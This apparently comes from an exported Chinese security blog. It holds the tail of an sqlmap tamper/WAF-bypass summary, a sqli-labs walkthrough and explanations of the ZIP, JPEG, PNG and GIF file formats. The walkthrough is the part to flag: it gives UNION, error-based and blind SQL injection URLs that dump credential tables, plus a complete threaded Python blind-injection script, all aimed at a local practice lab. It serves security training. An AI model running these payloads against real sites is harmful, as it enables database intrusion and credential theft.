1=1==&gt;1%bf%27-- 大写 uppercase.py123insert==&gt;INSERT HTTP头部注入 varnish.py添加一个 HTTP头 X-originating-IP来绕过 WAF 123456Examples:&gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)&gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)&gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)&gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)&gt;&gt; X-remote-IP: * or %00 or %0A 关键字内联注释 versionedmorekeywords.py1231 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#==&gt;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))# HTTP头部注入 xforwardedfor.py添加一个伪造的 HTTP 头X-Forwarded-For 来绕过 WAF 本文总结于以下参考文献: sqlmap用户手册 sqlmap用户手册[续] SQLMAP 实例COOKBOOK 使用SQLMAP对网站和数据库进行SQL注入攻击 使用sqlmap中tamper脚本绕过waf SQLMAP进阶使用 SQLMAP源码分析Part1:流程篇 SQLMap的前世今生 sqlmap自带的tamper你了解多少？ sqlmap 使用总结]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>tools</tag>
        <tag>SQL Injection</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs writeup]]></title>
    <url>%2Fblog%2Fsqli-labs%2F</url>
    <content type="text"><![CDATA[Sqli-labs是一个练习SQL注入的很好的一个平台，可以直接下载后使用。注意由于充满漏洞，推荐在虚拟机中使用，并使用host-only模式，不要让其联网。 平台搭建我这里是采用了虚拟机+win10+phpStudy,然后直接将下载的sqli-labs-master放到www文件夹中即可。 Basic Challenges每个less都有提示会告诉你是什么类型的题,我们也能看到后台源码，所以比较好去理解。 less-1简单的&#39;绕过 1http://10.37.129.3/sqli-labs-master/Less-1/?id=1' or 1=2 %23 发现正常运行，即注入成功。之后是比较基础的脱裤步骤，具体操作可以看我的另一篇文章SQL注入总结总结了基本步骤。本例练习一下脱裤，之后如果不是有一些特殊方式，就不再贴出来了。 获取字段数12http://10.37.129.3/sqli-labs-master/Less-1/?id=1' order by 3%23http://10.37.129.3/sqli-labs-master/Less-1/?id=1' order by 4%23 发现到4之后会报错，即字段数为3 获得显示位1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,2,3 %23 可以看到显示位为2,3,则其他信息可以通过在2,3位显示而被我们得到。 得到当前数据库、版本等信息1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,database(),@@version %23 查选库，获取所有数据库名1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,group_concat(schema_name),@@version from information_schema.schemata %23 得到所有数据库:information_schema,challenges,mysql,performance_schema,security 获取某个数据库的表名1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,group_concat(table_name),@@version from information_schema.tables where table_schema=0x7365637572697479%23 其中0x7365637572697479为security的hex()值 获取列名1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,group_concat(column_name),@@version from information_schema.columns where table_name=0x7573657273%23 可以看到获得了id,username,password这三个字段 获取内容1http://10.37.129.3/sqli-labs-master/Less-1/?id=' union select 1,group_concat(username),group_concat(password) from security.users%23 less-2123http://10.37.129.3/sqli-labs-master/Less-2/?id=2http://10.37.129.3/sqli-labs-master/Less-2/?id=2'http://10.37.129.3/sqli-labs-master/Less-2/?id=2 or 1=1 试探之后发现成功执行or 1=1所以显示的结果是id=1的内容，因为第二次试探发现有limit 0,1所以成功绕过。 less-312http://10.37.129.3/sqli-labs-master/Less-3/?id=1'http://10.37.129.3/sqli-labs-master/Less-3/?id=1')%23 根据报错，发现有个括号，直接闭合 less-41http://10.37.129.3/sqli-labs-master/Less-4/?id=2" 发现返回的信息是：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;2&quot;&quot;) LIMIT 0,1&#39; at line 1 可以得出它是将我们的内容(&quot;id&quot;)这样了，所以需要闭合两个，payload如下： 1http://10.37.129.3/sqli-labs-master/Less-4/?id=2") %23 less-51http://10.37.129.3/sqli-labs-master/Less-5/?id=2'%23 绕过成功，发现虽然没有显示位，但是有返回报错信息的。这里提供两种方式，一种是使用报错注入，另一种根据页面不同变化进行字符猜解。 报错注入：1http://10.37.129.3/sqli-labs-master/Less-5/?id=1' union select extractvalue(0x123,concat(0x3a3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a3a))%23 这样直接就有错误信息了 字符猜解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210import requestsimport threadingimport threadpoolimport binasciiclass Config(object): """ some configuration content,modify according to different targets payload for MySQL """ def __init__(self): self.prefix = "http://10.37.129.3/sqli-labs-master/Less-5/?id=1' " self.payload = "" self.suffix = "%23" self.match_string = "You are in."def sendRequest(payload): url = config.prefix + payload + config.suffix r = requests.get(url) return r.textdef acquireDatabaseNumber(): pre_payload = "AND (SELECT COUNT(*) FROM information_schema.schemata)=" number = 1 while True: payload = pre_payload + str(number) recv = sendRequest(payload) if config.match_string in recv: return number else: number += 1def acquireDatabaseContent(n): """ left and right can be modified according to different situations """ s = "" idx = 1 while True: left = 0 right = 255 while left &lt; right: mid = (left + right) / 2 payload = "AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT " + \ str(n) + ",1)," + str(idx) + ",1))" + "&gt;" + str(mid) recv = sendRequest(payload) if config.match_string in recv: left = mid + 1 else: right = mid if left == right and right != 0: s += chr(right) idx += 1 else: break databases_record.append(s) print(s)def acquireTableNumber(dbname): pre_payload = "AND (SELECT COUNT(*) FROM information_schema.tables where table_schema=0x" + \ str(binascii.b2a_hex(dbname)) + ")=" number = 1 while True: payload = pre_payload + str(number) recv = sendRequest(payload) if config.match_string in recv: return number else: number += 1def acquireTableContent(dbname, n): s = "" idx = 1 while True: left = 0 right = 255 while left &lt; right: mid = (left + right) / 2 payload = "AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=0x" + str( binascii.b2a_hex(dbname)) + " LIMIT " + str(n) + ",1)," + str(idx) + ",1))" + "&gt;" + str(mid) recv = sendRequest(payload) if config.match_string in recv: left = mid + 1 else: right = mid if left == right and right != 0: s += chr(right) idx += 1 else: break return sdef acquireTable(dbname): # remove default databases if dbname not in ['information_schema', 'mysql', 'performance_schema']: table_number = acquireTableNumber(dbname) table = [] for i in range(table_number): tablename = acquireTableContent(dbname, i) table.append(tablename) print('--------------------') print('|' + dbname + ' |\n--------------------') for name in table: print(name) tables_record.append(([dbname, name], None)) print('')def acquireColumnNumber(dbname, tablename): pre_payload = "AND (SELECT COUNT(*) FROM information_schema.columns where table_schema=0x" + \ str(binascii.b2a_hex(dbname)) + " AND table_name=0x" + \ str(binascii.b2a_hex(tablename)) + ")=" number = 1 while True: payload = pre_payload + str(number) recv = sendRequest(payload) if config.match_string in recv: return number else: number += 1def acquireColumnContent(dbname, tablename, n): s = "" idx = 1 while True: left = 0 right = 255 while left &lt; right: mid = (left + right) / 2 payload = "AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=0x" + str(binascii.b2a_hex( dbname)) + " AND table_name=0x" + str(binascii.b2a_hex(tablename)) + " LIMIT " + str(n) + ",1)," + str(idx) + ",1))" + "&gt;" + str(mid) recv = sendRequest(payload) if config.match_string in recv: left = mid + 1 else: right = mid if left == right and right != 0: s += chr(right) idx += 1 else: break return sdef acquireColumn(dbname, tablename): column_number = acquireColumnNumber(dbname, tablename) column = [] for i in range(column_number): columnname = acquireColumnContent(dbname, tablename, i) column.append(columnname) print('--------------------') print('|' + dbname + '.' + tablename + ' |\n--------------------') for name in column: print(name) print('')def guess(): databaseNumber = acquireDatabaseNumber() print("Database Number: " + str(databaseNumber)) # get databases name print('***DataBases***') parameters = [] for i in range(databaseNumber): parameters.append(i) req = threadpool.makeRequests(acquireDatabaseContent, parameters) [pool.putRequest(r) for r in req] pool.wait() # get tables name print('***Tables***') req = threadpool.makeRequests(acquireTable, databases_record) [pool.putRequest(r) for r in req] pool.wait() # get columns name print('***Columns***') req = threadpool.makeRequests(acquireColumn, tables_record) [pool.putRequest(r) for r in req] pool.wait()# Main entranceconfig = Config()# save recordsdatabases_record = []tables_record = []pool = threadpool.ThreadPool(20)guess() 这里写了一个脚本，使用线程池发送请求，获取所有数据库、表、列名内容(去除了默认数据库的内容)。使用二分搜索进行字符猜解，范围是0-255，可根据实际情况修改，payload也可根据不同环境进行修改。 less-6同less-5 只不过改为双引号&quot;即可。以下内容用于判断我们双引号注入成功了。 12http://10.37.129.3/sqli-labs-master/Less-6/?id=1" and 1=1%23http://10.37.129.3/sqli-labs-master/Less-6/?id=1" and 1=0%23 less-7这道题要求使用outfile,具体基础知识可以看sql-injection总结/outfile里面关于outfile load_file部分内容。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>SQL Injection</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZIP格式解析]]></title>
    <url>%2Fblog%2Farchives%2F</url>
    <content type="text"><![CDATA[ZIP文件格式是一种数据压缩和文档储存的文件格式，原名Deflate，发明者为菲尔·卡茨（Phil Katz），他于1989年1月公布了该格式的资料。ZIP通常使用后缀名“.zip”，它的MIME格式为application/zip。目前，ZIP格式属于几种主流的压缩格式之一，其竞争者包括RAR格式以及开放源码的7z格式。 ZIP官方文档中对ZIP文件格式作了总结： 1234567891011121314151617Overall .ZIP file format: [local file header 1] [file data 1] [data descriptor 1] . . . [local file header n] [file data n] [data descriptor n] [archive decryption header] (EFS) [archive extra data record] (EFS) [central directory] [zip64 end of central directory record] [zip64 end of central directory locator] [end of central directory record] 即zip主要由三部分组成： 压缩源文件数据区 核心目录 目录结束 local file header + file data + data descriptor central directory end of central directory record 我创建了一个压缩包，结构如下： 这里 NewFile.txthellp abc.sh 文件头 local file header格式如下： Offset Bytes Description 译 0 4 Local file header signature = 0x04034b50 (read as a little-endian number) 文件头标识，值固定0x 504B0304 小端模式 4 2 Version needed to extract (minimum) 解压文件所需 pkware最低版本 6 2 General purpose bit flag 通用比特标志位 8 2 Compression method 压缩方式 10 2 File last modification time 文件最后修改时间 12 2 File last modification date 文件最后修改日期 14 4 CRC-32 CRC-32校验码 18 4 Compressed size 压缩后的大小 22 4 Uncompressed size 未压缩的大小 26 4 File name length (n) 文件名长度 28 2 Extra field length (m) 扩展区长度 30 n File name 文件名 30+n m Extra field 扩展区 可以看到选中的部分为文件名字段，选中了7字节，对应前面文件名长度的0x 0700，16进制转字符串之后就是这里/. 文件数据 file data这里是我们文件夹的名字，跟在其后面的又是一个新的块。 这里在压缩是选择加密，可以发现，内容都变为了密文 数据描述 data descriptor数据描述符用于标识该文件压缩结束，该结构只有在相应的local file header中通用标记字段的第３bit设为１时才会出现，紧接在压缩文件源数据后。 Offset Bytes Description 译 0 4 固定值0x 504b0708 作为数据描述符开头，可以没有 0 4 crc-32 CRC-32校验码 4 4 compressed size 压缩后的大小 8 4 uncompressed size 未压缩的大小 这个字段出现的原因是：为了让应用程序生成压缩包时更灵活,可以在压缩的同时写入文件,因为在某些情况下可能要文件压缩和写入完成后才能获取具体的大小。 核心目录 Central directory记录了压缩文件的目录信息，在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据。 Offset Bytes Description 译 0 4 Central directory file header signature 核心目录文件header标识0x 504B0102 4 2 Version made by 压缩所用的pkware版本 6 2 Version needed to extract (minimum) 解压所需pkware的最低版本 8 2 General purpose bit flag 通用位标记 10 2 Compression method 压缩方法 12 2 File last modification time 文件最后修改时间 14 2 File last modification date 文件最后修改日期 16 4 CRC-32 CRC-32校验码 20 4 Compressed size 压缩后的大小 24 4 Uncompressed size 未压缩的大小 28 2 File name length (n) 文件名长度 30 2 Extra field length (m) 扩展域长度 32 2 File comment length (k) 文件注释长度 34 2 Disk number where file starts 文件开始位置的磁盘编号 36 2 Internal file attributes 内部文件属性 38 4 External file attributes 外部文件属性 42 4 relative offset of local header 本地文件头的相对位移 46 n File name 目录文件名 46+n m Extra field 扩展域 46+n+m k File comment 文件注释内容 目录结束标识 End of central directory record目录结束标识存在于整个归档包的结尾，用于标记压缩的目录数据的结束。每个压缩文件必须有且只有一个EOCD记录。 Offset Bytes Description 译 0 4 End of central directory signature 核心目录结束标记504B0506 4 2 Number of this disk 当前磁盘编号 6 2 number of the disk with the start of the central directory 核心目录开始位置的磁盘编号 8 2 total number of entries in the central directory on this disk 该磁盘上所记录的核心目录数量 10 2 total number of entries in the central directory 核心目录结构总数 12 2 Size of central directory (bytes) 核心目录的大小 16 4 offset of start of central directory with respect to the starting disk number 核心目录开始位置相对于archive开始的位移 20 2 .ZIP file comment length(n) 注释长度 22 n .ZIP Comment 注释内容]]></content>
      <categories>
        <category>file format analysis</category>
      </categories>
      <tags>
        <tag>zip</tag>
        <tag>archives</tag>
        <tag>file format analysis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[image文件格式解析]]></title>
    <url>%2Fblog%2Fimage%2F</url>
    <content type="text"><![CDATA[1. JPEG JPEG(jay-peg)是一种针对照片视频而广泛使用的一种有损压缩标准方法，其本身只有描述如何将一个视频转换为字节的数据流。但并没有说明这些字节如何在任何特定的存储媒体上被封存起来。JPEG的压缩方式通常是破坏性数据压缩，意即在压缩过程中图像的质量会遭受到可见的破坏，有一种以JPEG为基础的标准Lossless JPEG是采用无损的压缩方式，但Lossless JPEG并没有受到广泛的支持。 一个由C-Cube Microsystems等公司所创建的额外标准，称为JFIF（JPEG File Interchange Format，JPEG文件交换格式）详细说明如何从一个JPEG流，产出一个适合于电脑存储和传输（像是在互联网上）的文件。 JPEG/JFIF是万维网（World Wide Web）上最普遍的被用来存储和传输照片的格式。它并不适合于线条绘图（drawing）和其他文字或图标（iconic）的图形，因为它的压缩方法用在这些类型的图形上，得到的结果并不好（PNG和GIF格式通常是用来存储这类的图形；GIF每个像素只有8比特，并不很适合于存储彩色照片，PNG可以无损地存储照片，但是文件太大的缺点让它不太适合在网络上传输）。 简单概括下jpeg文件格式： 整个内容由标记信息和数据组成，标记信息包括标记代码和具体字段组成，记录了图片的某些属性，数据为图像的具体数据。 FF为特殊值，如果后边跟的是00,即FF 00表示图像数据内容中的FF值，若后边不为0，类似FF D8为某个具体标记码的值，代表标记信息的开始。 常用的标记有SOI、APP0、DQT、SOF0、DHT、DRI、SOS、EOI。 JFIF文件格式这里推荐一篇文章，讲得比较详细，在这里就不再赘述了。 这里推荐打开一张图片，然后对照着去看每一个标记代码和字段，会理解的更好一些，放上我对照的图片。 下面列出了一些常见标记内容。 SOI, Start of Image,图像开始标记代码 2字节 固定值0xFFD8 APP0, Application, 应用程序保留标记0标记代码 2字节 固定值0xFFE0包含9个字段： 字段名称 字段长度 字段含义 数据长度 2字节 ①~⑨ 9个字段的总长度，即不包括标记代码，但包括本字段 标识符 5字节 固定值0x 4A46 4946 00，即字符串JFIF0 版本号 2字节 一般是0x0102，表示JFIF的版本号1.2，可能会有其他数值代表其他版本 X和Y的密度单位 1字节 0：无单位；1：点数/英寸；2：点数/厘米 X方向像素密度 2字节 取值范围未知 Y方向像素密度 2字节 取值范围未知 缩略图水平像素数目 1字节 取值范围未知 缩略图垂直像素数目 1字节 取值范围未知 缩略图RGB位图 长度可能是3的倍数 缩略图RGB位图数据 本标记段可以包含图像的一个微缩版本，存为24位的RGB像素。如果没有微缩图像（这种情况更常见），则字段缩略图水平像素数目和字段缩略图垂直像素数目的值均为0。 APPn，Application，应用程序保留标记n，其中n=1～15(任选)标记代码 2字节 固定值0xFFE1~0xFFEF包含2个字段： 字段名称 字段长度 字段含义 数据长度 2字节 所有字段的总长度，即不包括标记代码，但包括本字段 详细信息 5字节 内容不定 Adobe Photoshop生成的JPEG图像中就用了APP1和APP13两个标记段分别存储了一幅图像的副本。 DQT，Define Quantization Table，定义量化表标记代码 2字节 固定值0xFFDB包含2个具体字段： 字段名称 字段长度 字段含义 数据长度 2字节 所有字段的总长度，即不包括标记代码，但包括本字段 量化表 精度及量化表ID 1字节 高4位：精度，只有两个可选值： 0：8位；1：16位,低4位：量化表ID，取值范围为0～3 表项 (64×(精度+1))字节 例如8位精度的量化表,其表项长度为64×（0+1）=64字节 本标记段中，字段②可以重复出现，表示多个量化表，但最多只能出现4次。 SOF0，Start of Frame，帧图像开始标记代码 2字节 固定值0xFFC0包含9个具体字段： 字段名称 字段长度 字段含义 数据长度 2字节 ①~⑨ 9个字段的总长度，即不包括标记代码，但包括本字段 图像高度 2字节 图像高度（单位：像素），如果不支持 DNL 就必须 &gt;0 图像宽度 2字节 图像宽度（单位：像素），如果不支持 DNL 就必须 &gt;0 颜色分量数 1字节 只有3个数值可选 1：灰度图；3：YCrCb或YIQ；4：CMYK,而JFIF中使用YCrCb，故这里颜色分量数恒为3 颜色分量信息 颜色分量数×3字节（通常为9字节) 颜色分量ID 1字节 取值范围未知 水平/垂直采样因子 1字节 高4位：水平采样因子 低4位：垂直采样因子 量化表 1字节 当前分量使用的量化表的ID 本标记段中，字段⑥应该重复出现，有多少个颜色分量，就出现多少次（一般为3次）。 DHT，Difine Huffman Table，定义哈夫曼表标记代码 2字节 固定值0xFFC4包含2个具体字段： 字段名称 字段长度 字段含义 数据长度 2字节 所有字段的总长度，即不包括标记代码，但包括本字段 哈夫曼表 表ID和表类型 1字节 高4位：类型，只有两个值可选 0：DC直流；1：AC交流 低4位：哈夫曼表ID，注意，DC表和AC表分开编码 不同位数的码字数量 16字节 编码内容 16个不同位数的码字数量之和（字节） 本标记段中，字段②可以重复出现（一般4次），也可以致出现1次。例如，Adobe Photoshop 生成的JPEG图片文件中只有1个DHT标记段，里边包含了4个哈夫曼表；而Macromedia Fireworks生成的JPEG图片文件则有4个DHT标记段，每个DHT标记段只有一个哈夫曼表。 DRI，Define Restart Interval，定义差分编码累计复位的间隔标记代码 2字节 固定值0xFFDD包含2个具体字段： 字段名称 字段长度 字段含义 数据长度 2字节 所有字段的总长度，即不包括标记代码，但包括本字段 MCU块的单元中的重新开始间隔 2字节 设其值为n，则表示每n个MCU块就有一个RSTn标记。第一个标记是RST0，第二个是 RST1等，RST7后再从RST0重复 如果没有本标记段，或间隔值为0时，就表示不存在重开始间隔和标记RST SOS，Start of Scan，扫描开始 12字节标记代码 2字节 固定值0xFFDA包含2个具体字段： 字段名称 字段长度 字段含义 数据长度 2字节 所有字段的总长度，即不包括标记代码，但包括本字段 颜色分量数 1字节 应该和SOF中的字段⑤的值相同，即：1：灰度图是；3： YCrCb或YIQ；4：CMYK,而JFIF中使用YCrCb，故这里颜色分量数恒为3 颜色分量信息 颜色分量ID 1字节 直流/交流系数表号 1字节 高4位：直流分量使用的哈夫曼树编号低4位：交流分量使用的哈夫曼树编号 压缩图像数据 谱选择开始 1字节 固定值0x00 谱选择结束 1字节 固定值0x3F 谱选择 1字节 在基本JPEG中总为00 本标记段中，字段③应该重复出现，有多少个颜色分量（字段②），就出现多少次（一般为3次）。本段结束后，紧接着就是真正的图像信息了。图像信息直至遇到一个标记代码就自动结束，一般就是以EOI标记表示结束。 EOI，End of Image，图像结束 2字节标记代码 2字节 固定值0xFFD9 2. PNG 便携式网络图形（Portable Network Graphics，PNG）是一种无损压缩的位图图形格式，支持索引、灰度、RGB三种颜色方案以及Alpha通道等特性。PNG的开发目标是改善并取代GIF作为适合网络传输的格式而不需专利许可，所以被广泛应用于互联网及其他方面上。 PNG图像格式文件由一个8字节的PNG文件标识（file signature）域和3个以上的后续数据块（IHDR、IDAT、IEND）组成。PNG文件包括8字节文件署名（89 50 4E 47 0D 0A 1A 0A，十六进制），用来识别PNG格式。 PNG定义了两种类型的数据块：一种是PNG文件必须包含、读写软件也都必须要支持的关键块（critical chunk）；另一种叫做辅助块（ancillary chunks），PNG允许软件忽略它不认识的附加块。这种基于数据块的设计，允许PNG格式在扩展时仍能保持与旧版本兼容。 关键数据块中有4个标准数据块： 文件头数据块IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。 调色板数据块PLTE（palette chunk）：必须放在图像数据块之前。 图像数据块IDAT（image data chunk）：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。 图像结束数据IEND（image trailer chunk）：放在文件尾部，表示PNG数据流结束。 每个数据块的结构都是一定的： 名称 字节数 说明 Length (长度) 4字节 指定数据块中数据域的长度，其长度不超过(231－1)字节 Chunk Type Code (数据块类型码) 4字节 数据块类型码由ASCII字母(A-Z和a-z)组成 Chunk Data (数据块数据) 可变长度 存储按照Chunk Type Code指定的数据 CRC (循环冗余检测) 4字节 存储用来检测是否有错误的循环冗余码 CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1 下面是常见数据块种类，有可能没有，灰色为关键数据块。所以整个PNG文件的格式为8950 4E47 0D0A 1A0A+数据块+数据块+数据块+······ 同样以实际例子来看一下各个字段： IHDR 文件头数据块IHDR(header chunk)它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，它的格式如下表所示。 域的名称 字节数 说明 Width 4字节 图像宽度，以像素为单位 Height 4字节 图像高度，以像素为单位 Bit depth 1字节 图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16 ColorType 1字节 颜色类型：0：灰度图像, 1，2，4，8或162：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16 PLTE 调色板数据块PLTE(palette chunk)它包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。 颜色 字节 意义 RED 1字节 0 = 黑色, 255 = 红 Green 1字节 0 = 黑色, 255 = 绿色 Blue 1字节 0 = 黑色, 255 = 蓝色 因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。真彩色图像和带α通道数据的真彩色图像也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。 IDAT图像数据块IDAT(image data chunk)它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。格式如同块格式，注意的是一般前一个IDAT写满后再回另开一个IDAT，所以如果发现一个IDAT长度不对就开始一个新的IDAT，很有可能是在IDAT中进行隐写 IEND 图像结束数据IEND(image trailer chunk)它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。00 00 00 00 49 45 4E 44 AE 42 60 82,IEND数据块的长度总是0000 0000，数据标识总是IEND4945 4E44，因此，CRC码也总是AE42 6082 3. GIF 图像互换格式（GIF，Graphics Interchange Format）是一种位图图形文件格式，以8位色（即256种颜色）重现真彩色的图像。它实际上是一种压缩文档，采用LZW压缩算法进行编码，有效地减少了图像文件在网络上传输的时间。它是目前万维网广泛应用的网络传输图像格式之一。只要图像不多于256色，则可既减少文件的大小，又保持成像的质量。一方面，在高彩图片上有着不俗表现的JPG格式却在简单的折线上效果不如人意。因此图像互换格式格式普遍适用于图表，按钮等等只需少量颜色的图像（如黑白照片）。1989年，CompuServe发布了一个名为89a的增强版本，在这个版本中，为图像互换格式文档扩充了图形控制区块、备注、说明、应用程序接口等四个区块，并提供了对透明色和多帧动画的支持。现在我们一般所说的GIF动画都是指89a的格式。 GIF文件格式如下，中间的部分可以无限重复，下面分别介绍每一个块。 文件头 Header文件头一般为6字节，由GIF署名(Signature)和版本号(version)组成，如下图选中部分： 开头必须为GIF三个字符，一般版本号为87a或者89a 逻辑屏幕标识符 Logical Screen Descriptor紧跟在文件头后面，这个块告诉decoder（解码器）图片需要占用的空间，固定为7字节，内容如下： 名称 字节数 说明 Canvas Width (画布宽度) 2字节 图像宽度 Canvas height (画布高度) 2字节 图像高度 Global Color Table Flag (全局颜色列表标志) 1bit 当置位时表示有全局颜色列表，pixel值有意义 Color resolution (颜色分辨率) 3bit cr+1的值为图像颜色的分辨率 Sort flag（排序标志） 1bit 如果为1，global color table中的颜色以“重要性降低”（decreasing importance）来排序，通常也就是“频率降低”方式。这个标志可能会对decoder有所帮助，不过并不是必要的，因此这里的例子将它简单地设置为0。这个标志是历史遗留产物。 pixel（全局颜色列表大小） 3bit 索引数2^(pixel+1) 背景颜色索引（background color index） 1字节 仅当global color table flag为1才有意义，此时这个标志应该设为0。在之前的“picture wall”模式中，我们说到GIF会有一个virtual canvas画布，因此理所当然会存在一个背景色，而我们这个标志就是指出这个背景颜色。同样，在现代引擎中它也随着“picture wall模式”一起被弃用了。 pixel aspect ratio（像素高宽比） 1字节 全局像素宽高比，GIF标准没有给出它存在的理由，不过目前对它的处理方式只是读取其值并保存下来。所有此值不为0的比例都是用(N+15)/64 注意，GIF格式多字节内容为小端模式，与PNG,GIF不同，即我们在实际图片中看到的宽度字节流40 01，其实值为0140即宽度为320像素 现代的处理引擎一般会忽略掉canvas width和canvas height，因为GIF最初被设计为一种类似picture wall（照片墙）的东西，思路是讲图片在一个virtual canvas（虚拟画布）中显示；现在GIF通常是作为用来保存动画中的帧的图片库，相当于是一个图片集合，由GIF处理引擎来在自己的canvas（画布）中处理图片，因此现在GIF格式中保存的信息显得没太大作用了。所以，现在canvas width和canvas height基本上就是个摆设了。 全局颜色列表 Global Color Table紧跟于逻辑屏幕标识符，GIF格式可以拥有global color table，或用于针对每个子图片集，提供local color table。每个color table由一个RGB（就像通常我们见到的（255，0，0）红色 那种）列表组成。由于之前表长度为2^(N+1),对于每个RGB值，则此表总共占用3*2^(N+1)个字节。 如下图，本例中由于piexl值为101则全局颜色列表大小为3*2^(5+1)=192字节，内容如下： 应用程序扩展 Application ExtensionGIF中扩展块都以0x21开始，后一个字节是扩展标签，标识扩展用途。应用程序扩展的标签是0xFF，它包含有应用程序的标识信息和应用程序数据。其中 Netscape 应用程序扩展常用于控制GIF的动画循环次数。Netscape 扩展长19个字节，前14个是应用程序的ACSII信息，后四个是数据子块，用于指定GIF的循环次数, 按unsigned整型存储，0表示无限循环。以本图为例： 名称 字节数 说明 扩展块标识 1字节 固定值0x21 扩展类型标识 1字节 应用程序扩展 固定值为0xFF 应用程序信息大小 1字节 此例为0x0B 应用程序信息 NETSCAPE2.0或其他值 应用程序数据大小 1字节 0x03 索引 1字节 0x01 数据 2字节 unsigned整数，0x00 00标识无限循环 结束符 1字节 固定值0x00 图像控制扩展 Graphics Control Extension用来控制跟在他后面图像的显示。前三字节0x21 F9 04（这4字节不包括最终结束字节00）同应用程序扩展的前三字节，均为固定值。 对其字段进行剖析： 名称 字节数 说明 扩展块标识 1字节 固定值0x21 扩展类型标识 1字节 应用程序扩展 固定值为0xF9 应用程序信息大小 1字节 固定值0x04 保留位 3bit disposal method（处理方法） 3bit 处置图形的方法：0 - 表示不处置1 - 不处置图形，把图形从当前位置移去2 - 回复到背景色3 - 回复到先前状态4-7 自定义 Use Input Flag（用户输入标志） 1bit 指出是否期待用户有输入之后才继续进行下去，置位表示期待，值否表示不期待。用户输入可以是按回车键、鼠标点击等，可以和延迟时间一起使用，在设置的延迟时间内用户有输入则马上继续进行，或者没有输入直到延迟时间到达而继续 Transparent Color Flag（透明颜色标志） 1bit 置位表示使用透明颜色 Delay time（延时） 2字节 单位为1/100秒,暂停规定时间后再继续往下处理数据流 Transparent Color Index（透明色索引） 1字节 透明色索引值 结束符 1字节 固定值0x00 图像标识符 Image Descriptor固定长度 10字节 名称 字节数 说明 image separator（图像分隔符） 2字节 固定值0x2C image left(X方向偏移量) 2字节 image top(Y方向偏移量) 1字节 image width(图片宽度) 2字节 图片宽度 image height(图片高度) 2字节 图片高度 local color table flag(局部颜色表标记) 1bit 置位时标识紧接在图象标识符之后有一个局部颜色列表，供紧跟在它之后的一幅图象使用；值否时使用全局颜色列表，忽略pixel值。 interlace flag（隔行扫描标志） 1bit 隔行扫描方式会改变图像渲染到屏幕上的方式，从而减少烦人的视觉闪烁（类似垂直同步）。隔行扫描在显示器上的效果是，第一轮扫描先立即模糊地显示图像，随后再一轮将其填充锐化。这种方式会让人们感觉更舒服，因为它可以让人们模糊地意识到即将显示的东西是什么，而不是等待像素点被一行一行地填充绘制。要支持这种显示方式，图片的扫描行需要以一种特定的顺序来存储，需要分为4个部分，每个部分都是一个完整的模糊显示，通过4次显示加成使得图片越来越清晰，最终完全呈现。否则使用顺序排列。 sort flag(分类标志) 1bit 如果置位表示紧跟着的局部颜色列表分类排列 保留位 2bit 必须初始化为0 pixel 3bit 局部颜色表大小，2^(pixel+1) 局部颜色表 Local Color Table如果local color table flag置位，则有这个内容，格式同全局，仅供此幅图像使用。 图像数据 Image data这里就是真正的图像信息，第一个字节是LZW minimum code 